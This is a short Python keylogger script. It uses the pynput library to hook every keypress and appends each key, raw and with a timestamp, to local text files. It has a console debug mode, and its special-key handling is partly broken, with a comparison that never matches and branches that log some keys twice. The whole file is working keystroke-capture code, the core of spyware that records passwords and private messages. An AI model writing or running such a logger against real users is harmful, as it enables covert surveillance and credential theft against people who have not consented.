import time

from pynput.keyboard import Key, Listener

debug = True # used to print confirmations of keypresses to the console

def listen():
    with Listener(on_press = on_press) as listener:
        listener.join() # when a key is pressed, run the on_press method which writes to a file (runs the on_press function)

# function used to catch errors, as well as to print output to the console, if debug is on
def on_press(key):
    try:
        if debug:
            print('alphanumeric key {0} pressed'.format(key.char))
        write_to_file_verbose(str(timestamp()), str(key))
        write_to_file_raw(key)

    except AttributeError:
        if debug:
            print('special key {0} pressed'.format(key))
        write_to_file_verbose(str(timestamp()), str(key))
        write_to_file_raw(key)

# used for write_to_file_verbose()
def timestamp():
    return time.asctime(time.localtime(time.time()))

def write_to_file_raw(key):
    path = 'keylog_raw.txt'

    with open(path, 'a') as lines:
        key = str(key).strip('\'')

        # adds 'Key.esc' to the end of '[ ESC ]' for some reason
        if key == Key.esc:
            lines.write('[ ESC ]\n')
        if key == 'Key.backspace':
            lines.write('[ BACKSPACE ]\n')
        if key == 'Key.space':
            lines.write(' \n')
        if key == 'Key.enter':
            lines.write('\n')
        else:
            lines.write(key + '\n')

def write_to_file_verbose(time, key_input):
    path = 'keylog_timestamped.txt'

    with open(path, 'a') as lines:
        lines.write(str(timestamp()) + ': ')
        lines.write(key_input + ' key was pressed' + '\n')

def main():
    listen()

main()